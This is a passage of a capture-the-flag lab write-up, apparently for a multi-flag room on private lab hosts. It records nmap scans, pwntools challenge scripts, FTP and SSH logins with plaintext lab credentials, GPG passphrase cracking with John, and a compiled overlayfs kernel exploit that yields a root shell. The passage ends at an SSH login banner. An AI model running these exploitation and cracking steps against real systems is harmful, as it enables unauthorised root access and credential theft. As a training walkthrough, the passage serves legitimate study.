MAC Address: 02:2F:4A:59:0F:A6 (Unknown)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 10.20 seconds
root@kali
```

# flag 85
- view-source:http://10.10.227.180/hidden/

```html
<p>Username and password please</p>
<form action="" method="POST">
<p>Username:</p>
<input type="text" name="user"/>
<p>Password:</p>
<input type="text" name="pass"/><br>
<input type="submit" name="submit"/> 
</form>
<!-- ac0d0a292a3725daf32d58083e8e194c:8dbdda48fb8748d6746f1965824e966a -->
<!-- this is a base64 -->
```

- md5
```
lay:simple
```

```

MD5 hash easy peasy. The flag85: <flag>. Also, FTP pass: zq9vpxdxzj3i0ml2i9mz
```

# flag82
```
root@kali:~/pwntools# ls
CHANGELOG.md     examples              MANIFEST.in  pwntools.egg-info  setup.py
CONTRIBUTING.md  extra                 pwn          README.md          TESTING.md
docs             LICENSE-pwntools.txt  pwnlib       requirements.txt   travis
root@kali:~/pwntools# vi 3338.py
root@kali:~/pwntools# python3 3338.py
flag 82: <flag>

b'Congratz, here something for you\n'
b'FTP user: get_laid\n'
root@kali:~/pwntools#


```

```python
root@kali:~/pwntools# cat 3338.py
#!/usr/bin/env python3

from pwn import *
from base64 import b64decode

host, port = '10.10.227.180', 3338
context.log_level = 'warn'

s = remote(host, port)
s.recvline()

while True:

    b64enc = s.recvline()
    b64enc = b64enc.decode('utf-8')

    if 'flag' in b64enc:
        print(b64enc)
        print(s.recvline())
        print(s.recvline())
        break

    b64dec = b64decode(b64enc)
    s.sendline(b64dec)

s.close()
```

# flag 83
```
root@kali:~/pwntools# cat 3404.py
#!/usr/bin/env python3

from pwn import *
import re

host, port = '10.10.227.180', 3404
context.log_level = 'warn'

s = remote(host, port)
s.recvline()

while True:

    op = s.recvline()
    op = op.decode('utf-8')

    if 'flag' in op:
        print(op)
        print(s.recvline())
        print(s.recvline())
        break

    reop = re.search('^(\d+)\s(minus|add|multiply)\s(\d+)\\n$', op, re.IGNORECASE)
    n1 = int(reop.group(1))
    sgn = reop.group(2)
    n2 = int(reop.group(3))

    if sgn == 'add':
        res = n1 + n2
    elif sgn == 'minus':
        res = n1 - n2
    else:
        res = n1 * n2

    s.sendline(str(res))

s.close()
root@kali:~/pwntools# python3 3404.py
flag 83: <flag>

b'Congratz, here something for you\n'
b'SSH user: hidden\n'
root@kali:~/pwntools#
```

```
oot@kali:~# ftp 10.10.227.180
Connected to 10.10.227.180.
220 (vsFTPd 2.3.5)
Name (10.10.227.180:root): get_laid
331 Please specify the password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls -al
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
drwxr-xr-x    2 0        0            4096 Oct 05  2019 .
drwxr-xr-x    2 0        0            4096 Oct 05  2019 ..
-rw-r--r--    1 1000     1000          105 Oct 05  2019 secret.txt.gpg
226 Directory send OK.
ftp> mget *
mget secret.txt.gpg?
200 PORT command successful. Consider using PASV.
150 Opening BINARY mode data connection for secret.txt.gpg (105 bytes).
226 Transfer complete.
105 bytes received in 0.00 secs (178.3288 kB/s)

```

```
root@kali:~# gpg2john secret.txt.gpg >hash
Created directory: /root/.john

File secret.txt.gpg
[gpg2john] MDC is missing, expect lots of false positives!
root@kali:~# ls
3338.py  Documents  hash           Music     Public    secret.txt.gpg  thinclient_drives
Desktop  Downloads  hydra.restore  Pictures  pwntools  Templates       Videos
root@kali:~# john hash
Using default input encoding: UTF-8
Loaded 1 password hash (gpg, OpenPGP / GnuPG Secret Key [32/64])
Cost 1 (s2k-count) is 65536 for all loaded hashes
Cost 2 (hash algorithm [1:MD5 2:SHA1 3:RIPEMD160 8:SHA256 9:SHA384 10:SHA512 11:SHA224]) is 2 for all loaded hashes
Cost 3 (cipher algorithm [1:IDEA 2:3DES 3:CAST5 4:Blowfish 7:AES128 8:AES192 9:AES256 10:Twofish 11:Camellia128 12:Camellia192 13:Camellia256]) is 3 for all loaded hashes
Will run 2 OpenMP threads
Note: This format may emit false positives, so it will keep trying even after
finding a possible candidate.
Proceeding with single, rules:Single
Press 'q' or Ctrl-C to abort, almost any other key for status
Almost done: Processing the remaining buffered candidate passwords, if any.
Proceeding with wordlist:/usr/share/john/password.lst, rules:Wordlist
go               (?)
```


- check GUI!! console is up
```
root@kali:~# gpg --passphrase go --decrypt secret.txt.gpg
gpg: CAST5 encrypted data
gpg: encrypted with 1 passphrase
flag 84: <flag>

SSH pass: this_is_hidden

gpg: WARNING: message was not integrity protected
gpg: Hint: If this message was created before the year 2003 it is
     likely that this message is legitimate.  This is because back
     then integrity protection was not widely used.
gpg: Use the option '--ignore-mdc-error' to decrypt anyway.
gpg: decryption forced to fail!
root@kali:~#
```

# 86
```
root@kali:~# ssh hidden@10.10.227.180
The authenticity of host '10.10.227.180 (10.10.227.180)' can't be established.
ECDSA key fingerprint is SHA256:7cNY5hJsFkaScaFTQDbKMW4v8W7kHxiDfNA0PMKxT+k.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.227.180' (ECDSA) to the list of known hosts.
hidden@10.10.227.180's password:
Welcome to Ubuntu 12.04.5 LTS (GNU/Linux 3.13.0-32-generic i686)

 * Documentation:  https://help.ubuntu.com/
New release '14.04.6 LTS' available.
Run 'do-release-upgrade' to upgrade to it.

Last login: Fri Dec 13 05:28:49 2019
hidden@ubuntu:~$ whoami
hidden
hidden@ubuntu:~$ ls -al
total 40
drwxr-xr-x 4 hidden hidden 4096 Dec 13  2019 .
drwxr-xr-x 3 root   root   4096 Oct  5  2019 ..
-rw------- 1 root   root    185 Nov 10  2019 .bash_history
-rw-r--r-- 1 hidden hidden  220 Oct  5  2019 .bash_logout
-rw-r--r-- 1 hidden hidden 3486 Oct  5  2019 .bashrc
drwx------ 2 hidden hidden 4096 Oct  5  2019 .cache
-rw-rw-r-- 1 hidden hidden   90 Dec 13  2019 flag86.txt
-rw-r--r-- 1 hidden hidden  675 Oct  5  2019 .profile
-rw-rw-r-- 1 hidden hidden   66 Oct  5  2019 .selected_editor
drwxrwxr-x 2 hidden hidden 4096 Oct  5  2019 server
hidden@ubuntu:~$ cat flag86.txt
Time to root the flag. Hint: something is awfully outdated.
```


```
Caching directories . . . . . . . . . . . . . . . . . . . . DONE
====================================( System Information )====================================
[+] Operative system
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#kernel-exploits
Linux version 3.13.0-32-generic (buildd@toyol) (gcc version 4.6.3 (Ubuntu/Linaro 4.6.3-1ubuntu5) ) #57~precise1-Ubuntu SMP Tue Jul 15 03:50:54 UTC 2014
Distributor ID: Ubuntu
Description:    Ubuntu 12.04.5 LTS
Release:        12.04
Codename:       precise
```
- https://www.exploit-db.com/exploits/37292
```
hidden@ubuntu:~$ gcc ofs.c -o ofs
hidden@ubuntu:~$ ./ofs
spawning threads
mount #1
mount #2
child threads done
/etc/ld.so.preload created
creating shared library
# whoami
root
#
```

```
# whoami
root
# cd /root
# ls -al
total 28
drwx------  3 root root 4096 Dec 13  2019 .
drwxr-xr-x 22 root root 4096 Oct  5  2019 ..
-rw-------  1 root root  538 Oct  5  2019 .bash_history
-rw-r--r--  1 root root 3106 Apr 19  2012 .bashrc
drwx------  2 root root 4096 Oct  5  2019 .gnupg
-rw-r--r--  1 root root  140 Apr 19  2012 .profile
-rw-rw-r--  1 root root   67 Dec 13  2019 ready.txt
# cat ready.txt
Ready for final stage?
ctf100endgame

flag87:
```

# end game
```
root@kali:~# nmap -sV -sC -T5 -p- 10.10.18.91
Starting Nmap 7.80 ( https://nmap.org ) at 2020-07-31 15:09 UTC
Nmap scan report for ip-10-10-18-91.eu-west-1.compute.internal (10.10.18.91)
Host is up (0.00046s latency).
Not shown: 65533 filtered ports
PORT     STATE SERVICE VERSION
21/tcp   open  ftp     vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_Can't get directory listing: TIMEOUT
| ftp-syst:
|   STAT:
| FTP server status:
|      Connected to ::ffff:10.10.203.232
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 3
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
9999/tcp open  abyss?
| fingerprint-strings:
|   FourOhFourRequest, GenericLines, GetRequest, HTTPOptions, JavaRMI:
|     ***************************
|     Port knocking input *
|     ***************************
|     user, please enter the port sequence
|     format is (can be more than 4): PORT PORT PORT PORT
|     Wrong sequence
|     Bye!
|   NULL:
|     ***************************
|     Port knocking input *
|     ***************************
|     user, please enter the port sequence
|_    format is (can be more than 4): PORT PORT PORT PORT
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port9999-TCP:V=7.80%I=7%D=7/31%Time=5F243469%P=x86_64-pc-linux-gnu%r(NU
SF:LL,B6,"\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\n\*\x20\x
SF:20\x20Port\x20knocking\x20input\x20\x20\x20\*\n\*\*\*\*\*\*\*\*\*\*\*\*
SF:\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\nHi\x20user,\x20please\x20enter\x20the\x
SF:20port\x20sequence\nThe\x20format\x20is\x20\(can\x20be\x20more\x20than\
SF:x204\):\x20PORT\x20PORT\x20PORT\x20PORT\n>\x20")%r(GetRequest,CA,"\*\*\
SF:*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\n\*\x20\x20\x20Port\x
SF:20knocking\x20input\x20\x20\x20\*\n\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*
SF:\*\*\*\*\*\*\*\*\*\nHi\x20user,\x20please\x20enter\x20the\x20port\x20se
SF:quence\nThe\x20format\x20is\x20\(can\x20be\x20more\x20than\x204\):\x20P
SF:ORT\x20PORT\x20PORT\x20PORT\n>\x20Wrong\x20sequence\nBye!\n")%r(HTTPOpt
SF:ions,CA,"\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\n\*\x20
SF:\x20\x20Port\x20knocking\x20input\x20\x20\x20\*\n\*\*\*\*\*\*\*\*\*\*\*
SF:\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\nHi\x20user,\x20please\x20enter\x20the
SF:\x20port\x20sequence\nThe\x20format\x20is\x20\(can\x20be\x20more\x20tha
SF:n\x204\):\x20PORT\x20PORT\x20PORT\x20PORT\n>\x20Wrong\x20sequence\nBye!
SF:\n")%r(FourOhFourRequest,CA,"\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*
SF:\*\*\*\*\*\*\n\*\x20\x20\x20Port\x20knocking\x20input\x20\x20\x20\*\n\*
SF:\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\nHi\x20user,\x20pl
SF:ease\x20enter\x20the\x20port\x20sequence\nThe\x20format\x20is\x20\(can\
SF:x20be\x20more\x20than\x204\):\x20PORT\x20PORT\x20PORT\x20PORT\n>\x20Wro
SF:ng\x20sequence\nBye!\n")%r(JavaRMI,CA,"\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*
SF:\*\*\*\*\*\*\*\*\*\*\*\n\*\x20\x20\x20Port\x20knocking\x20input\x20\x20
SF:\x20\*\n\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\nHi\x20u
SF:ser,\x20please\x20enter\x20the\x20port\x20sequence\nThe\x20format\x20is
SF:\x20\(can\x20be\x20more\x20than\x204\):\x20PORT\x20PORT\x20PORT\x20PORT
SF:\n>\x20Wrong\x20sequence\nBye!\n")%r(GenericLines,CA,"\*\*\*\*\*\*\*\*\
SF:*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\n\*\x20\x20\x20Port\x20knocking\x
SF:20input\x20\x20\x20\*\n\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*
SF:\*\*\*\nHi\x20user,\x20please\x20enter\x20the\x20port\x20sequence\nThe\
SF:x20format\x20is\x20\(can\x20be\x20more\x20than\x204\):\x20PORT\x20PORT\
SF:x20PORT\x20PORT\n>\x20Wrong\x20sequence\nBye!\n");
MAC Address: 02:AA:06:D1:68:EE (Unknown)
Service Info: OS: Unix

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 89.39 seconds
root@kali:~#
```

```
root@kali:~# ftp 10.10.18.91
Connected to 10.10.18.91.
220 (vsFTPd 3.0.3)
Name (10.10.18.91:root): anonymous
331 Please specify the password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls -al
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
drwxr-xr-x    2 0        0            4096 Oct 06  2019 .
drwxr-xr-x    2 0        0            4096 Oct 06  2019 ..
-rw-r--r--    1 0        0             199 Oct 06  2019 flag88
-rw-r--r--    1 0        0              70 Oct 06  2019 flag89
-rw-r--r--    1 0        0              55 Oct 06  2019 flag90
-rw-r--r--    1 0        0              58 Oct 06  2019 flag91
-rw-r--r--    1 0        0              56 Oct 06  2019 flag92
-rw-r--r--    1 0        0            1512 Oct 06  2019 flag93
-rw-r--r--    1 0        0            4235 Oct 06  2019 flag94
-rw-r--r--    1 0        0            1475 Oct 06  2019 flag95
226 Directory send OK.
ftp> mget *
mget flag88?
200 PORT command successful. Consider using PASV.
150 Opening BINARY mode data connection for flag88 (199 bytes).
226 Transfer complete.
199 bytes received in 0.00 secs (55.7635 kB/s)
mget flag89?
200 PORT command successful. Consider using PASV.
150 Opening BINARY mode data connection for flag89 (70 bytes).
226 Transfer complete.
70 bytes received in 0.07 secs (0.9413 kB/s)
mget flag90?
200 PORT command successful. Consider using PASV.
150 Opening BINARY mode data connection for flag90 (55 bytes).
226 Transfer complete.
55 bytes received in 0.00 secs (112.8381 kB/s)
mget flag91?
200 PORT command successful. Consider using PASV.
150 Opening BINARY mode data connection for flag91 (58 bytes).
226 Transfer complete.
58 bytes received in 0.00 secs (99.3695 kB/s)
mget flag92?
200 PORT command successful. Consider using PASV.
150 Opening BINARY mode data connection for flag92 (56 bytes).
226 Transfer complete.
56 bytes received in 0.00 secs (112.2947 kB/s)
mget flag93?
200 PORT command successful. Consider using PASV.
150 Opening BINARY mode data connection for flag93 (1512 bytes).
226 Transfer complete.
1512 bytes received in 0.00 secs (2.8054 MB/s)
mget flag94?
200 PORT command successful. Consider using PASV.
150 Opening BINARY mode data connection for flag94 (4235 bytes).
226 Transfer complete.
4235 bytes received in 0.00 secs (3.2729 MB/s)
mget flag95?
200 PORT command successful. Consider using PASV.
150 Opening BINARY mode data connection for flag95 (1475 bytes).
226 Transfer complete.
1475 bytes received in 0.00 secs (1.6281 MB/s)
ftp> exit
221 Goodbye.
root@kali:~#
```

# flag88
```
root@kali:~# cat flag88
... .  ..... ...  ..... .....  ... ..  .... ..  . .....  .... ..  . ...  .... .  ... ....  .... .  .... ....  . ..  . .....  .... ..  ..... ..  ..... ....  . .....  ..... .....  ..... .

port?: 7177
root@kali:~#
```

- tap decode
- ABKDEFGHIJLMNOPQRSTUVWXYZ

# flag89
```
dfxxf afada fgfdx agxdg xagdg daxda dggag fffad

key:end

port?: 7994
https://cryptii.com/pipes/adfgvx-cipher
decode
key end 
```

# flag90
```
root@kali:~# cat flag90
EYTGZAZDIYLZHIOLAGUMQZ

key: Gravity Falls
port?: 7885

https://www.dcode.fr/playfair-cipher
GRAVITYFLSBCDEHKMNOPQUWXZ
remove X
```

# flag 91

```
dNalVNm+tAHcUPKRYO4FsO1-fPHYrQKooMb-lC168Q4xmR1wu61YtAn6+
xxdecode

flag 91: 
port?: 9932
```


# flag92
uuencode
```
port?: 6612 
```

# flag93
ppencode
```
root@kali:~# cat flag93
#!/usr/bin/perl -w
length q rmdir and print chr ord qw q fcntl q and print chr ord qw q lc q and print chr ord q each ne and print chr ord qw q glob q and print chr ord q q eq and print chr oct oct ord q mkdir m and print chr oct oct ord uc q cmp lc and print chr oct ord uc q chr uc and print chr ord q q eq and print chr ord qw q use q and print chr ord qw q le q and print chr ord q ref or and print chr ord q open no and print chr length q q splice srand getservbyname setnetent ne reset endprotoent foreach scalar rewinddir cos setnetent not else getprotobyname q and print chr ord q local and print chr oct ord uc q oct no and print chr oct ord uc qw q ge q and print chr ord q tie lt and print chr hex ord q q eq and print chr ord qw q uc q and print chr ord q chop uc and print chr ord q eq ge and print chr hex ord q q eq and print chr ord q ge log and print chr oct oct ord uc q cmp lc and print
 chr ord q my alarm and print chr ord qw q warn q and print chr length q x rename sethostent srand pack pipe setpwent syscall else eq split sleep endservent qw require symlink ne keys ord require x and print chr ord q qr q and print chr length q continue vec and print chr ord q split s and print chr ord q pop and print chr ord q qr q and print chr ord q gt log and print chr oct ord uc q rmdir and print chr oct ord uc q chr uc and print chr ord qq q q and print chr oct oct oct ord q eq ge and print chr oct oct oct ord q eq ne and print chr oct oct ord uc q cmp lc and print chr oct oct ord uc q else

root@kali:~# chmod +x flag93
root@kali:~# ./flag93
flag 93: 
port?: 1132root@kali:~#
```

# flag94
```
ﾟωﾟﾉ= /｀ｍ´）ﾉ ~┻━┻   //*´∇｀*/ ['_']; o=(ﾟｰﾟ)  =_=3; c=(ﾟΘﾟ) =(ﾟｰﾟ)-(ﾟｰﾟ); (ﾟДﾟ) =(ﾟΘﾟ)= (o^_^o)/ (o^_^o);(ﾟДﾟ)={ﾟΘﾟ: '_' ,ﾟωﾟﾉ : ((ﾟωﾟﾉ==3) +'_') [ﾟΘﾟ] ,ﾟｰﾟﾉ :(ﾟωﾟﾉ+ '_')[o^_^o -(ﾟΘﾟ)] ,ﾟДﾟﾉ:((ﾟｰﾟ==3) +'_')[ﾟｰﾟ] }; (ﾟДﾟ) [ﾟΘﾟ] =((ﾟωﾟﾉ==3) +'_') [c^_^o];(ﾟДﾟ) ['c'] = ((ﾟДﾟ)+'_') [ (ﾟｰﾟ)+(ﾟｰﾟ)-(ﾟΘﾟ) ];(ﾟДﾟ) ['o'] = ((ﾟДﾟ)+'_') [ﾟΘﾟ];(ﾟoﾟ)=(ﾟДﾟ) ['c']+(ﾟДﾟ) ['o']+(ﾟωﾟﾉ +'_')[ﾟΘﾟ]+ ((ﾟωﾟﾉ==3) +'_') [ﾟｰﾟ] + ((ﾟДﾟ) +'_') [(ﾟｰﾟ)+(ﾟｰﾟ)]+ ((ﾟｰﾟ==3) +'_') [ﾟΘﾟ]+((ﾟｰﾟ==3) +'_') [(ﾟｰﾟ) - (ﾟΘﾟ)]+(ﾟДﾟ) ['c']+((ﾟДﾟ)+'_') [(ﾟｰﾟ)+(ﾟｰﾟ)]+ (ﾟДﾟ) ['o']+((ﾟｰﾟ==3) +'_') [ﾟΘﾟ];(ﾟДﾟ) ['_'] =(o^_^o) [ﾟoﾟ] [ﾟoﾟ];(ﾟεﾟ)=((ﾟｰﾟ==3) +'_') [ﾟΘﾟ]+ (ﾟДﾟ) .ﾟДﾟﾉ+((ﾟДﾟ)+'_') [(ﾟｰﾟ) + (ﾟｰﾟ)]+((ﾟｰﾟ==3) +'_') [o^_^o -ﾟΘﾟ]+((ﾟｰﾟ==3) +'_') [ﾟΘﾟ]+ (ﾟωﾟﾉ +'_') [ﾟΘﾟ]; (ﾟｰﾟ)+=(ﾟΘﾟ); (ﾟДﾟ)[ﾟεﾟ]='\\'; (ﾟДﾟ).ﾟΘﾟﾉ=(ﾟДﾟ+ ﾟｰﾟ)[o^_^o -(ﾟΘﾟ)];(oﾟｰﾟo)=(ﾟωﾟﾉ +'_')[c^_^o];(ﾟДﾟ) [ﾟoﾟ]='\"';(ﾟДﾟ) ['_'] ( (ﾟДﾟ) ['_'] (ﾟεﾟ+/*´∇｀*/(ﾟДﾟ)[ﾟoﾟ]+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+(ﾟｰﾟ)+((o^_^o) +(o^_^o))+(ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+((ﾟｰﾟ) + (ﾟΘﾟ))+(ﾟｰﾟ)+(ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+(ﾟｰﾟ)+(ﾟΘﾟ)+(ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+(ﾟｰﾟ)+((ﾟｰﾟ) + (o^_^o))+(ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+(c^_^o)+(ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (o^_^o))+(ﾟΘﾟ)+(ﾟДﾟ)[ﾟεﾟ]+((o^_^o) +(o^_^o))+(ﾟｰﾟ)+(ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (o^_^o))+((o^_^o) - (ﾟΘﾟ))+(ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+(c^_^o)+(ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+(ﾟｰﾟ)+(o^_^o)+(ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+((o^_^o) +(o^_^o))+(ﾟΘﾟ)+(ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+(ﾟｰﾟ)+((o^_^o) +(o^_^o))+(ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+(ﾟｰﾟ)+((o^_^o) - (ﾟΘﾟ))+(ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+((o^_^o) +(o^_^o))+((o^_^o) +(o^_^o))+(ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (o^_^o))+(ﾟΘﾟ)+(ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+(ﾟｰﾟ)+((o^_^o) +(o^_^o))+(ﾟДﾟ)[ﾟεﾟ]+((o^_^o) +(o^_^o))+(ﾟΘﾟ)+(ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+((ﾟｰﾟ) + (ﾟΘﾟ))+((ﾟｰﾟ) + (ﾟΘﾟ))+(ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+(ﾟｰﾟ)+((o^_^o) - (ﾟΘﾟ))+(ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+(ﾟｰﾟ)+((ﾟｰﾟ) + (o^_^o))+(ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+((ﾟｰﾟ) + (o^_^o))+((o^_^o) - (ﾟΘﾟ))+(ﾟДﾟ)[ﾟεﾟ]+((o^_^o) +(o^_^o))+(ﾟｰﾟ)+(ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+((o^_^o) +(o^_^o))+((ﾟｰﾟ) + (o^_^o))+(ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+((o^_^o) +(o^_^o))+(o^_^o)+(ﾟДﾟ)[ﾟεﾟ]+((o^_^o) +(o^_^o))+((o^_^o) - (ﾟΘﾟ))+(ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+((ﾟｰﾟ) + (ﾟΘﾟ))+(ﾟｰﾟ)+(ﾟДﾟ)[ﾟεﾟ]+((o^_^o) +(o^_^o))+((ﾟｰﾟ) + (o^_^o))+(ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+(ﾟｰﾟ)+(ﾟΘﾟ)+(ﾟДﾟ)[ﾟεﾟ]+((o^_^o) +(o^_^o))+(ﾟΘﾟ)+(ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+((o^_^o) - (ﾟΘﾟ))+(ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+((o^_^o) +(o^_^o))+(o^_^o)+(ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+((o^_^o) +(o^_^o))+(o^_^o)+(ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+((ﾟｰﾟ) + (ﾟΘﾟ))+(c^_^o)+(ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+(c^_^o)+(ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+((o^_^o) +(o^_^o))+((ﾟｰﾟ) + (ﾟΘﾟ))+(ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+((o^_^o) +(o^_^o))+(o^_^o)+(ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+(ﾟｰﾟ)+((ﾟｰﾟ) + (ﾟΘﾟ))+(ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+((o^_^o) +(o^_^o))+((o^_^o) - (ﾟΘﾟ))+(ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (o^_^o))+((o^_^o) - (ﾟΘﾟ))+(ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+(c^_^o)+(ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+(ﾟｰﾟ)+((ﾟｰﾟ) + (o^_^o))+(ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+((o^_^o) +(o^_^o))+((ﾟｰﾟ) + (ﾟΘﾟ))+(ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+(ﾟｰﾟ)+((ﾟｰﾟ) + (ﾟΘﾟ))+(ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+((o^_^o) +(o^_^o))+(o^_^o)+(ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+((o^_^o) +(o^_^o))+(ﾟｰﾟ)+(ﾟДﾟ)[ﾟoﾟ]) (ﾟΘﾟ)) ('_');
```
- aadecode
```
flag 94: 
ssh user: guest
```

```
$=~[];$={___:++$,$$$$:(![]+"")[$],__$:++$,$_$_:(![]+"")[$],_$_:++$,$_$$:({}+"")[$],$$_$:($[$]+"")[$],_$$:++$,$$$_:(!""+"")[$],$__:++$,$_$:++$,$$__:({}+"")[$],$$_:++$,$$$:++$,$___:++$,$__$:++$};$.$_=($.$_=$+"")[$.$_$]+($._$=$.$_[$.__$])+($.$$=($.$+"")[$.__$])+((!$)+"")[$._$$]+($.__=$.$_[$.$$_])+($.$=(!""+"")[$.__$])+($._=(!""+"")[$._$_])+$.$_[$.$_$]+$.__+$._$+$.$;$.$$=$.$+(!""+"")[$._$$]+$.__+$._+$.$+$.$$;$.$=($.___)[$.$_][$.$_];$.$($.$($.$$+"\""+$.$_$_+(![]+"")[$._$_]+$.$$$_+"\\"+$.__$+$.$$_+$._$_+$.__+"(\\\""+$.$$$$+(![]+"")[$._$_]+$.$_$_+"\\"+$.__$+$.$__+$.$$$+"\\"+$.$__+$.___+$.$__$+$.$_$+"\\"+$.$__+$.___+"\\"+$.__$+$.$_$+$.__$+"\\"+$.__$+$.$$_+$._$$+"\\"+$.$__+$.___+"\\"+$.__$+$.$$_+$.__$+"\\"+$.__$+$.$$$+$.__$+$.___+"\\"+$.__$+$.$$_+$.__$+$.$_$+(![]+"")[$._$_]+$.$__+"\\"+$.__$+$.$$$+$.__$+$._+$._$+$.$_$$+$.$_$+$.$_$+$._$+"\\"+$.__$+$.$_$+$._$_+"\\"+$.__$+$.$$_+$.__$+$._$$+$.__+$._$$+"\\"+$.__$+$.$$$+$._$_+"\\"+$.$__+$.___+$.$_$_+"\\"+$.__$+$.$_$+$.$$_+$.$$_$+"\\"+$.$__+$.___+"\\"+$.__$+$.$$_+$._$$+"\\"+$.__$+$.$$_+$._$$+"\\"+$.__$+$.$_$+$.___+"\\"+$.$__+$.___+"\\"+$.__$+$.$$_+$.___+$.$_$_+"\\"+$.__$+$.$$_+$._$$+"\\"+$.__$+$.$$_+$._$$+"\\"+$.$__+$.___+"\\"+$.__$+$.$_$+$.__$+"\\"+$.__$+$.$$_+$._$$+"\\"+$.$__+$.___+$.__+"\\"+$.__$+$.$_$+$.___+"\\"+$.__$+$.$_$+$.__$+"\\"+$.__$+$.$$_+$._$$+"_\\"+$.__$+$.$_$+$.__$+"\\"+$.__$+$.$$_+$._$$+"_"+$.__+"\\"+$.__$+$.$_$+$.___+$.$$$_+"_"+$.$$$_+"\\"+$.__$+$.$_$+$.$$_+$.$$_$+"\\\"\\"+$.$__+$.___+")"+"\"")())();
```
jsfuck
```
flag 95 is <pass> and ssh pass is this_is_the_end
```

```
root@kali:~# telnet 10.10.18.91 9999
Trying 10.10.18.91...
Connected to 10.10.18.91.
Escape character is '^]'.
***************************
*   Port knocking input   *
***************************
Hi user, please enter the port sequence
The format is (can be more than 4): PORT PORT PORT PORT
> 7177 7994 7885 9932 6612 1132
Something happen
Good luck!
Connection closed by foreign host.
```


```
root@kali:~# ssh guest@10.10.18.91
The authenticity of host '10.10.18.91 (10.10.18.91)' can't be established.
ECDSA key fingerprint is SHA256:pwKoGqcIFXEjU5fb3Akyr4X3aTmamm+c+0yNNlRt7Tc.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.18.91' (ECDSA) to the list of known hosts.
guest@10.10.18.91's password:
Permission denied, please try again.
guest@10.10.18.91's password:
Welcome to Ubuntu 18.04.3 LTS (GNU/Linux 4.15.0-65-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Fri Jul 31 15:57:46 UTC 2020

  System load:  0.13               Processes:           90
  Usage of /:   19.9% of 19.56GB   Users logged in:     0
  Memory usage: 15%                IP address for eth0: 10.10.18.91
  Swap usage:   0%


39 packages can be updated.
